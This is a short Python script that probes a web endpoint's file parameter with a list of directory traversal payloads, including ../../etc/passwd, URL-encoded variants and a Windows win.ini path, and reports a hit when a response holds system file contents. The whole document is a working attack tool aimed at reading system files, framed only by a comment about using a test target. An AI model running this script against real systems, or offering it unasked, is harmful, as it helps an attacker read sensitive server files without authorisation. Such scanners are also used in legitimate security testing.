import requests

# Target vulnerable endpoint (change to your test target)
target_url = "http://example.com/download?file="

# Common directory traversal payloads
payloads = [
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",  # URL-encoded
    "..\\..\\..\\windows\\win.ini"  # For Windows targets
]

print("[+] Testing for directory traversal vulnerabilities...\n")

for payload in payloads:
    url = target_url + payload
    try:
        response = requests.get(url, timeout=5)
        if "root:" in response.text or "[extensions]" in response.text:
            print(f"[!] Potential Directory Traversal found with payload: {payload}")
            print(f"    URL: {url}")
            break
        else:
            print(f"[-] Tried {payload} — No sensitive data exposed.")
    except requests.exceptions.RequestException:
        print(f"[!] Error connecting to {url}")